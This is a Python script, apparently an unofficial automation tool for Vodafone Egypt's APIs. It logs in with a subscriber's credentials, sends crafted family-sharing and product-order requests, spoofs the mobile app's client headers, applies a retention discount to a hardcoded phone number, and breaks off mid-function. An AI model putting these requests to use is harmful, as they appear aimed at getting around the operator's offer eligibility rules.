import random
import string
import threading
import requests
import csv
import time
from bs4 import BeautifulSoup
from threading import Thread
from typing import List, Dict, Any, Optional
from datetime import datetime



red_color = '\033[1;31m'
yellow_color = '\033[1;33m'
green_color = '\033[2;32m'
white_color = '\033[1;97m'
blue_color = '\033[1;34m'
light_blue_color = '\033[2;36m'
light_green_color = '\033[1;32m'
light_yellow_color = '\033[1;33m'

# count = 40


def toFlex260(token, num):
    headers = {
    'Accept': 'application/json',
    'Accept-Language': 'EN',
    'Authorization': token,
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    'Origin': 'https://web.vodafone.com.eg',
    'Referer': 'https://web.vodafone.com.eg/spa/flexManagement/usage',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
    'clientId': 'WebsiteConsumer',
    'msisdn': num,
    'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'channel': {
            'name': 'MobileApp',
        },
        'orderItem': [
            {
                'action': 'modify',  # تغيير من repurchase إلى modify
                'product': {
                    'relatedParty': [
                        {
                            'id': num,
                            'name': 'MSISDN',
                            'role': 'Subscriber',
                        },
                    ],
                    'id': 'Flex_2021_523',  # ID الخاص بالباقة الجديدة أو نفس الباقة لو تغيير داخلي
                    'encProductId': 'DrcyT20RYh0XOUEHgbpz6IfbTbTWfkpb2nyGssBFRm8rGx6lmOuPs4GeczFRVSiI37DyFHo1P5ls4Oh0ocJjdiloSYHLAY8s7xbSaJDLh1SOjG+htCV5PTyFgx6wkzvus+K6unXm7Vz7QPNVd489W7hnIeGCwbyx1ubn8vg0v6Vz2vIYEQ/Rd6go02ViHbsalBqXychpJ/Gk5FWAxSJi+BrbuBPxppGZ6m9Gn8zFP2NBwigRBoJMBJcSJ41XIiQnYYQvNh7vLZENpIQEuGsMftA=',
                },
            },
        ],
        '@type': 'FlexMigration',  # تغيير النوع إلى Migration
    }

    response = requests.post(
        'https://web.vodafone.com.eg/services/dxl/pom/productOrder',
        headers=headers,
        json=json_data,
    )
    return response.text

def generation_link(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))

def get_authorization(number, password):
    with requests.Session() as req:
        url_action = f'https://web.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/auth?client_id' \
                     f'=website&redirect_uri=https%3A%2F%2Fweb.vodafone.com.eg%2Far%2FKClogin&state=286d1217-db14' \
                     f'-4846-86c1-9539beea01ed&response_mode=query&response_type=code&scope=openid&nonce=' \
                     f'{generation_link(10)}&kc_locale=en '
        response_url_action = req.get(url_action)
        soup = BeautifulSoup(response_url_action.content, 'html.parser')
        get_url_action = soup.find('form').get('action')
        header_request = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,'
                      'application/signed-exchange;v=b3;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-GB,en;q=0.9,ar;q=0.8,ar-EG;q=0.7,en-US;q=0.6',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'web.vodafone.com.eg',
            'Origin': 'https://web.vodafone.com.eg',
            'Referer': url_action,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
                          'Chrome/81.0.4044.138 Safari/537.36'
        }
        data = {
            'username': number,
            'password': password
        }
        response_login = req.post(get_url_action, headers=header_request, data=data)
        check_login = response_login.url
        _check_KClogin = check_login.find('KClogin')
        if _check_KClogin != -1:
            _code = check_login[check_login.index('code=') + 5:]
            header_access_token = {
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-GB,en;q=0.9,ar;q=0.8,ar-EG;q=0.7,en-US;q=0.6',
                'Connection': 'keep-alive',
                'Content-type': 'application/x-www-form-urlencoded',
                'Host': 'web.vodafone.com.eg',
                'Origin': 'https://web.vodafone.com.eg',
                'Referer': 'https://web.vodafone.com.eg/ar/KClogin',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
                              'Chrome/81.0.4044.138 Safari/537.36 '
            }
            data_access_token = {
                'code': _code,
                'grant_type': 'authorization_code',
                'client_id': 'website',
                'redirect_uri': 'https://web.vodafone.com.eg/ar/KClogin'
            }
            send_data_access_token = req.post(
                'https://web.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token',
                headers=header_access_token, data=data_access_token)
            jwt = send_data_access_token.json()['access_token']
            print(light_blue_color,f"{number} login successfully")
            return "Bearer " + jwt
        else:
            return "error"

def cancel_invetation(ownerNum, ownerPass, memberNum):
    try:
        # الحصول على التوكن
        ownerToken = get_authorization(ownerNum, ownerPass)
        if ownerToken == 'error':
            print("❌ خطأ: الرقم السري أو رقم المالك غير صحيح!")
            return {"success": False, "message": "Incorrect owner number or password!"}
        headers = {
            'Accept': 'application/json',
            'Accept-Language': 'AR',
            'Authorization':ownerToken,
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
            'Origin': 'https://web.vodafone.com.eg',
            'Referer': 'https://web.vodafone.com.eg/spa/familySharing',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
            'clientId': 'WebsiteConsumer',
            'msisdn': ownerNum,
            'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        json_data = {
            'name': 'FlexFamily',
            'type': 'CancelInvitation',
            'category': [
                {
                    'value': '47',
                    'listHierarchyId': 'TemplateID',
                },
            ],
            'parts': {
                'member': [
                    {
                        'id': [
                            {
                                'value': ownerNum,
                                'schemeName': 'MSISDN',
                            },
                        ],
                        'type': 'Owner',
                    },
                    {
                        'id': [
                            {
                                'value': memberNum,
                                'schemeName': 'MSISDN',
                            },
                        ],
                        'type': 'Member',
                    },
                ],
            },
        }

        response = requests.post(
            'https://web.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup',
            headers=headers,
            json=json_data,
        )
    except requests.exceptions.RequestException as e:
        print(f"❌ حدث خطأ أثناء الاتصال بالخادم: {str(e)}")
        return {"success": False, "error": str(e)}

    except Exception as e:
        print(f"🔥 خطأ غير متوقع: {str(e)}")
        return {"success": False, "error": str(e)}

def renew(number, password):
    if get_authorization(number, password) == 'error':
        print('الرقم او الباسورد غير صحيح')
    else:
        headers = {
            'Accept': 'application/json',
            'Accept-Language': 'AR',
            'Authorization': get_authorization(number, password),
            'Connection': 'keep-alive',
            'Origin': 'https://web.vodafone.com.eg',
            'Referer': 'https://web.vodafone.com.eg/spa/flexManagement/usage',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
            'clientId': 'WebsiteConsumer',
            'msisdn': number,
            'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }
        json_data = {
            'channel': {
                'name': 'MobileApp',
            },
            'orderItem': [
                {
                    'action': 'repurchase',
                    'product': {
                        'relatedParty': [
                            {
                                'id': number,
                                'name': 'MSISDN',
                                'role': 'Subscriber',
                            },
                        ],
                        'id': 'Flex_Family_Dummy',
                        'encProductId': 'Bwq6giveWClgenpoLQg2EinAp2UfeQrRfuCf6ETfCRUC3XpSnkUcxGt8m0eDtWLDhFd2dwXbQ4Sbxo6dL0uWLOtklqRlLcPcLZ3RZYNDAuJJu6Aae0hqoDEwSBJKnxcLU07e2NSkcMD4zXiGIxI8Fz89ZjWXjcnCKzy3YHnspupnfpRGWc5Oom78',
                    },
                },
            ],
            '@type': 'FlexRenew',
        }
        response = requests.post('https://web.vodafone.com.eg/services/dxl/pom/productOrder', headers=headers,
                                 json=json_data)
        print(response.content)

def discount(number, password):
    token = get_authorization(number,password)
    if token == 'error':
        print("Incorrect number or password!")
    else:
        headers = {
            'Accept': 'application/json',
            'Accept-Language': 'EN',
            'Authorization': token,
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
            'Origin': 'https://web.vodafone.com.eg',
            'Referer': 'https://web.vodafone.com.eg/spa/migration',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'clientId': 'WebsiteConsumer',
            'msisdn': '01026106450',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        json_data = {
            '@type': 'InterventionTariff',
            'channel': {
                'name': 'WEBSITE',
            },
            'orderItem': [
                {
                    'id': 'Flex_2021_523',
                    'action': 'add',
                    '@type': 'Access fees Discount',
                    'product': {
                        'encProductId': 'rMmp5D4awochUSw61NN0/92OXxlramFf9ZE0+9lQG0znHBKvH/rxnoz2/OYDEnz7RxGRQ1mNb/WFaS6q17ujMay+z+RlNhr0bbPvlLN8+Werl6pJagu3Y1jRxtTuHx1I4FqTQHHkJS6AqfLpZUesLdd97wSQTQkXwPMYrZYmTMrueQf7/GM7TyLr5a9rCA4YVxQ=',
                        'relatedParty': [
                            {
                                '@referredType': 'prepaid',
                                'name': 'MSISDN',
                                'id': '01026106450',
                                'role': 'Subscriber',
                            },
                            {
                                '@referredType': 'prepaid',
                                'id': '523',
                                'name': 'TariffID',
                                'role': 'TariffID',
                            },
                        ],
                        'characteristic': [
                            {
                                'name': 'TariffRank',
                                'value': '1',
                            },
                            {
                                'name': 'TariffID',
                                'value': '523',
                            },
                            {
                                'name': 'Quota',
                            },
                            {
                                'name': 'Validity',
                                'value': '1',
                                '@type': 'MONTH',
                            },
                            {
                                'name': 'CohortId',
                                'value': '24',
                            },
                            {
                                'name': 'MigrationDesc',
                                'value': 'Intervention Offer Migration',
                            },
                            {
                                'name': 'offerRank',
                                'value': '1',
                            },
                            {
                                'name': 'MaxAdjustmentNumber',
                                'value': '1',
                            },
                        ],
                        'productSpecification': [
                            {
                                'id': 'Flex Family',
                                'name': 'BundleType',
                            },
                            {
                                'id': '0',
                                'name': 'RatePlanType',
                            },
                            {
                                'id': 'Retention With Offer',
                                'name': 'Category',
                            },
                            {
                                'id': 'Upon Renewal / Repurchase',
                                'name': 'Migration Rule',
                            },
                        ],
                    },
                    'itemPrice': [
                        {
                            'name': 'OriginalPrice',
                            'price': {
                                'taxIncludedAmount': {
                                    'value': 130,
                                    'unit': 'LE',
                                },
                            },
                        },
                        {
                            'name': 'MigrationFees',
                            'price': {
                                'taxIncludedAmount': {
                                    'value': 0,
                                    'unit': 'LE',
                                },
                            },
                        },
                    ],
                },
            ],
            'characteristic': [
                {
                    'name': 'MPTrackingID',
                    'value': '2774627492',
                },
                {
                    'name': 'TopTariffs',
                    'value': '5',
                },
            ],
        }

        response = requests.post(
            'https://web.vodafone.com.eg/services/dxl/pom/productOrder',
            headers=headers,
            json=json_data,
        )

def add1Member(ownerNum, ownerPass, memberNum, value = 10):
    Flexat = 515
    if value == 10:
        Flexat = 523
    elif value == 20:
        Flexat = 517
    elif value == 40:
        Flexat = 515

    ownerToken = get_authorization(ownerNum,ownerPass)
    if ownerToken == 'error':
        print("Incorrect owner number or password!")
    else:
        headers = {  
        'Accept': 'application/json',
        'Accept-Language': 'EN',
        'Authorization':ownerToken ,
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://web.vodafone.com.eg',
        'Referer': 'https://web.vodafone.com.eg/spa/familySharing',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'clientId': 'WebsiteConsumer',
        'msisdn': ownerNum,
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        }

        json_data = {
            'name': 'FlexFamily',
            'type': 'SendInvitation',
            'category': [
                {
                    'value': Flexat,
                    'listHierarchyId': 'PackageID',
                },
                {
                    'value': '47',
                    'listHierarchyId': 'TemplateID',
                },
                {
                    'value': Flexat,
                    'listHierarchyId': 'TierID',
                },
                {
                    'value': 'percentage',
                    'listHierarchyId': 'familybehavior',
                },
            ],
            'parts': {
                'member': [
                    {
                        'id': [
                            {
                                'value': ownerNum,
                                'schemeName': 'MSISDN',
                            },
                        ],
                        'type': 'Owner',
                    },
                    {
                        'id': [
                            {
                                'value': memberNum,
                                'schemeName': 'MSISDN',
                            },
                        ],
                        'type': 'Member',
                    },
                ],
                'characteristicsValue': {
                    'characteristicsValue': [
                        {
                            'characteristicName': 'quotaDist1',
                            'value': value,
                            'type': 'percentage',
                        },
                    ],
                },
            },
        }
        payload = {
            "name": "FlexFamily",
            "type": "SendInvitation",
            "category": [
                {"value": "523", "listHierarchyId": "PackageID"},
                {"value": "47", "listHierarchyId": "TemplateID"},
                {"value": "523", "listHierarchyId": "TierID"},
                {"value": "percentage", "listHierarchyId": "familybehavior"}
            ],
            "parts": {
                "member": [
                    {
                        "id": [{"value": ownerNum, "schemeName": "MSISDN"}],
                        "type": "Owner"
                    },
                    {
                        "id": [{"value": memberNum, "schemeName": "MSISDN"}],
                        "type": "Member"
                    }
                ],
                "characteristicsValue": {
                    "characteristicsValue": [
                        {"characteristicName": "quotaDist1", "value": value, "type": "percentage"}
                    ]
                }
            }
        }

        r2 = requests.patch(
            'https://web.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup',
            headers=headers,
            json=payload,
        ).text
        if str('Generic System Error') in str(r2):
            print("عفوا حدث خطأ")
        elif str('Customer not eligible-Family Owner') in str(r2):
            print("الرقم صاحب عيله")
        elif str('You have reached the maximum number of family') in str(r2):
            print("صاحب العيله عندو افراد اكتر من العدد المحدد له ")
        elif str('Customer not eligible-Family member') in str(r2):
            print(f"الفرد({memberNum}) موجود في عيله تانيه ")
        elif str('Not Found') in str(r2):
            print("مش نافع ولا يوجد سبب محدد ")
        elif str('Customer not eligible- Enterprise Customer') in str(r2):
            print("الخط بزنس او كان بزنس ")
        else:
            print(r2)

def add2Members(ownerNum, ownerPass, memberNum1, value=10):
    try:
        # الحصول على التوكن
        ownerToken = get_authorization(ownerNum, ownerPass)
        if ownerToken == 'error':
            print("❌ خطأ: الرقم السري أو رقم المالك غير صحيح!")
            return {"success": False, "message": "Incorrect owner number or password!"}

        # إعداد الهيدر
        headers = {  
            'Accept': 'application/json',
            'Accept-Language': 'EN',
            'Authorization': ownerToken,
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
            'Origin': 'https://web.vodafone.com.eg',
            'Referer': 'https://web.vodafone.com.eg/spa/familySharing',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'clientId': 'WebsiteConsumer',
            'msisdn': ownerNum,  # جعل رقم المالك ديناميكيًا بدلًا من الرقم الثابت
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        # إعداد البيانات المرسلة
        # members = [
        #     {'id': [{'value': ownerNum, 'schemeName': 'MSISDN'}], 'type': 'Owner'},
        #     {'id': [{'value': memberNum1, 'schemeName': 'MSISDN'}], 'type': 'Member'},
        #     {'id': [{'value': memberNum2, 'schemeName': 'MSISDN'}], 'type': 'Member'},
        # ],[
        #     {'id': [{'value': ownerNum, 'schemeName': 'MSISDN'}], 'type': 'Owner'},
        #     {'id': [{'value': memberNum2, 'schemeName': 'MSISDN'}], 'type': 'Member'},
        #     {'id': [{'value': memberNum1, 'schemeName': 'MSISDN'}], 'type': 'Member'},
        # ]

        # إدراجهم مرة واحدة إلى الـ JSON
        json_data = {
            'name': 'FlexFamily',
            'type': 'SendInvitation',
            'category': [
                {'value': '523', 'listHierarchyId': 'PackageID'},
                {'value': '47', 'listHierarchyId': 'TemplateID'},
                {'value': '523', 'listHierarchyId': 'TierID'},
                {'value': 'percentage', 'listHierarchyId': 'familybehavior'},
            ],
            'parts': {
                'member': [
                    {
                        'id': [
                            {
                                'value': ownerNum,
                                'schemeName': 'MSISDN',
                            },
                        ],
                        'type': 'Owner',
                    },
                    {
                        "id": [
                            {
                                "value": memberNum1,
                                "schemeName": "MSISDN"
                            }
                        ],
                        'type': 'Member',
                    },
                    
                ],  
                'characteristicsValue': {
                    'characteristicsValue': [
                        {'characteristicName': 'quotaDist1', 'value': value, 'type': 'percentage'},
                    ],
                },
            },
        }

        # إرسال الطلب
        response = requests.post(
            'https://web.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup',
            headers=headers,
            json=json_data,
            timeout=10  # تحديد مهلة زمنية لتجنب التعليق
        )
        print("\n owner token: {ownerToken}\n")
       # ✅ التحقق من نجاح الطلب
        if response.status_code in [200, 201]:  # التعامل مع 200 و 201 كنجاح
            print(f"✅ تمت إضافة الأعضاء بنجاح! (كود: {response.status_code})")
            try:
                response_data = response.json()
            except ValueError:
                response_data = {}  # في حال كانت الاستجابة فارغة
            
            return {"success": True, "status_code": response.status_code, "data": response_data}

        else:
            print(f"⚠️ خطأ: لم يتم تنفيذ الطلب! (كود الحالة: {response.status_code})")
            print("📌 التفاصيل:", response.text)
            return {"success": False, "status_code": response.status_code, "message": response.text}

    except requests.exceptions.RequestException as e:
        print(f"❌ حدث خطأ أثناء الاتصال بالخادم: {str(e)}")
        return {"success": False, "error": str(e)}

    except Exception as e:
        print(f"🔥 خطأ غير متوقع: {str(e)}")
        return {"success": False, "error": str(e)}

def addMember(on, mn, token, value=10):
    headers = {
        'Accept': 'application/json',
        'Accept-Language': 'EN',
        'Authorization': token,
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://web.vodafone.com.eg',
        'Referer': 'https://web.vodafone.com.eg/spa/familySharing/manageFamily',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        "User-Agent": "okhttp/4.11.0",
        "x-agent-operatingsystem": "11",
        "clientId": "AnaVodafoneAndroid",
        "x-agent-device": "Samsung_Galaxy_A52",
        "x-agent-version": "2024.7.1",
        "x-agent-build": "600",
        'msisdn': on,
        'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
        'sec-ch-ua-mobile': '?0',
    }

    json_data = {
        'name': 'FlexFamily',
        'type': 'SendInvitation',
        'category': [
            {
                'value': '523',
                'listHierarchyId': 'PackageID',
            },
            {
                'value': '47',
                'listHierarchyId': 'TemplateID',
            },
            {
                'value': '523',
                'listHierarchyId': 'TierID',
            },
            {
                'value': 'percentage',
                'listHierarchyId': 'familybehavior',
            },
        ],
        'parts': {
            'member': [
                {
                    'id': [
                        {
                            'value': on,
                            'schemeName': 'MSISDN',
                        },
                    ],
                    'type': 'Owner',
                },
                {
                    'id': [
                        {
                            'value': mn,
                            'schemeName': 'MSISDN',
                        },
                    ],
                    'type': 'Member',
                },
            ],
            'characteristicsValue': {
                'characteristicsValue': [
                    {
                        'characteristicName': 'quotaDist1',
                        'value': value,
                        'type': 'percentage',
                    },
                ],
            },
        },
    }

    response = requests.patch(
        'https://mobile.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup',
        headers=headers,
        json=json_data,
    )
    if str(response.status_code) in ['200', '201', '{}', '555']:
        print(light_green_color,f"invetation sent ({mn}) [{response.status_code}] success")
    else:
        print(red_color,f"can't send invetation to ({mn}) [{response.status_code}] failed")
    return response

def addMember1(on, op, mn,  value=10):
    token = get_authorization(on, op)
    headers = {
        "api-host": "ProductOrderingManagement",
        "useCase": "MIProfile",
        "Authorization": token,
        "api-version": "v2",
        "x-agent-operatingsystem": "11",
        "clientId": "AnaVodafoneAndroid",
        "x-agent-device": "Samsung_Galaxy_A52",
        "x-agent-version": "2024.7.1",
        "x-agent-build": "600",
        "msisdn": on,
        "Accept": "application/json",
        "Accept-Language": "ar",
        "Content-Type": "application/json; charset=UTF-8",
        "Host": "mobile.vodafone.com.eg",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/4.11.0"
    }
    

    json_data = {
        'name': 'FlexFamily',
        'type': 'SendInvitation',
        'category': [
            {
                'value': '523',
                'listHierarchyId': 'PackageID',
            },
            {
                'value': '47',
                'listHierarchyId': 'TemplateID',
            },
            {
                'value': '523',
                'listHierarchyId': 'TierID',
            },
            {
                'value': 'percentage',
                'listHierarchyId': 'familybehavior',
            },
        ],
        'parts': {
            'member': [
                {
                    'id': [
                        {
                            'value': on,
                            'schemeName': 'MSISDN',
                        },
                    ],
                    'type': 'Owner',
                },
                {
                    'id': [
                        {
                            'value': mn,
                            'schemeName': 'MSISDN',
                        },
                    ],
                    'type': 'Member',
                },
            ],
            'characteristicsValue': {
                'characteristicsValue': [
                    {
                        'characteristicName': 'quotaDist1',
                        'value': value,
                        'type': 'percentage',
                    },
                ],
            },
        },
    }

    response = requests.patch(
        'https://web.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup',
        headers=headers,
        json=json_data,
    )
    return response

def get_active_members(on, token,raise_on_error: bool = True) -> List[Dict[str, Any]]:
   
    headers = {
        'Accept': 'application/json',
        'Accept-Language': 'EN',
        'Authorization': token,
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Referer': 'https://web.vodafone.com.eg/spa/familySharing/manageFamily',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        'clientId': 'WebsiteConsumer',
        'msisdn': on,
        'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    resp = requests.get(
        'https://web.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup?type=Family&$.parts.member.type=owner',
        headers=headers,
    )


    if resp.status_code != 200:
        if raise_on_error:
            resp.raise_for_status()
        return []

    try:
        data = resp.json()
    except ValueError:
        # رد غير JSON
        return []

    # البيانات قد تكون list أو dict
    items = data if isinstance(data, list) else [data]

    result: List[Dict[str, Any]] = []
    for item in items:
        parts = item.get("parts", {}) or {}
        members = parts.get("member", []) or []
        for m in members:
            status = str(m.get("status", "")).strip()
            if status == "1":
                # رقم الموبايل
                msisdn = None
                id_list = m.get("id", [])
                if isinstance(id_list, list) and id_list:
                    msisdn = id_list[0].get("value")

                # البحث عن قيمة الفليكس
                flex = None
                characteristic = m.get("characteristic", {}) or {}
                chars = characteristic.get("characteristicsValue", []) or []
                if isinstance(chars, list):
                    for c in chars:
                        # كل كائن ممكن يحتوي الاسم والقيمة
                        if c.get("characteristicName") == "flex":
                            v = c.get("value")
                            # حاول تحويلها int بعد تنظيف الفواصل
                            try:
                                flex = int(str(v).replace(",", "").strip())
                            except Exception:
                                flex = v
                            break

                result.append({
                    "msisdn": msisdn,
                    "flex": flex,
                    "type": m.get("type"),
                    "status": status
                })

    return result

def send_invitation(auth_token, owner_msisdn, member_msisdn, quota_value):
    url = "https://web.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"
    headers = {
        "Accept": "application/json",
        "Accept-Language": "EN",
        "Authorization": f"{auth_token}",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "Origin": "https://web.vodafone.com.eg",
        "Referer": "https://web.vodafone.com.eg/spa/familySharing",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
        "clientId": "WebsiteConsumer",
        "msisdn": owner_msisdn
    }

    data = {
        "name": "FlexFamily",
        "type": "SendInvitation",
        "category": [
            {"value": "523", "listHierarchyId": "PackageID"},
            {"value": "47", "listHierarchyId": "TemplateID"},
            {"value": "523", "listHierarchyId": "TierID"},
            {"value": "percentage", "listHierarchyId": "familybehavior"}
        ],
        "parts": {
            "member": [
                {"id": [{"value": owner_msisdn, "schemeName": "MSISDN"}], "type": "Owner"},
                {"id": [{"value": member_msisdn, "schemeName": "MSISDN"}], "type": "Member"}
            ],
            "characteristicsValue": {
                "characteristicsValue": [
                    {"characteristicName": "quotaDist1", "value": str(quota_value), "type": "percentage"}
                ]
            }
        }
    }

    response = requests.post(url, headers=headers, json=data)
    return response.status_code, response.text

def get(ownerNum,ownerPass):
    ownerToken = get_authorization(ownerNum,ownerPass)
    if ownerToken == 'error':
        print("Incorrect owner number or password!")
    else:
        url = "https://web.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"
        params = {
            "type": "Family",
            "$.parts.member.type": "member"
        }

        headers = {
            "Accept": "application/json",
            "Accept-Language": "AR",
            "Authorization": ownerToken,  # أكمل التوكن هنا
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "Referer": "https://web.vodafone.com.eg/spa/familySharing",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
            "clientId": "WebsiteConsumer",
            "msisdn": ownerNum,
            "sec-ch-ua": '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        }

        response = requests.get(url, headers=headers, params=params)

        if response.status_code == 200:
            print("✅ Success:")
            print(response.json())
        else:
            print(f"❌ Failed ({response.status_code}): {response.text}")

def get2(ownerNum,ownerPass):
    ownerToken = get_authorization(ownerNum,ownerPass)
    if ownerToken == 'error':
        print("Incorrect owner number or password!")
    else:
        url = "https://web.vodafone.com.eg/services/dxl/catalog/productOffering/523"
        params = {
            "@type": "FlexFamily",
            "category.@referredType": "Consumer"
        }

        headers = {
            "Accept": "application/json",
            "Accept-Language": "AR",
            "Authorization": ownerToken,
            "Content-Type": "application/json",
            "Connection": "keep-alive",
            "Referer": "https://web.vodafone.com.eg/spa/familySharing",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
            "clientId": "WebsiteConsumer",
            "msisdn": ownerNum,
            "sec-ch-ua": '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        }

        response = requests.get(url, headers=headers, params=params)

        # طباعة البيانات
        if response.ok:
            data = response.json()
            print("✅ البيانات المسترجعة:")
            print(data)
        else:
            print("❌ حدث خطأ:")
            print(response.status_code, response.text)

def change_value(ownerNum,ownerPass, num, value):
    ownerToken = get_authorization(ownerNum,ownerPass)
    if ownerToken == 'error':
        print("Incorrect owner number or password!")
    else:
        url = "https://web.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"
        headers = {
            "Accept": "application/json",
            "Accept-Language": "AR",
            "Authorization": ownerToken,
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "Origin": "https://web.vodafone.com.eg",
            "Referer": "https://web.vodafone.com.eg/spa/familySharing/manageFamily",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
            "clientId": "WebsiteConsumer",
            "msisdn": ownerNum,
            "sec-ch-ua": '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
        }

    

        payload = {
            "name": "FlexFamily",
            "type": "QuotaRedistribution",
            "category": [
                {"value": "47", "listHierarchyId": "TemplateID"},
                {"value": "percentage", "listHierarchyId": "familybehavior"}
            ],
            "parts": {
                "member": [
                    {
                        "id": [{"value": ownerNum, "schemeName": "MSISDN"}],
                        "type": "Owner"
                    },
                    {
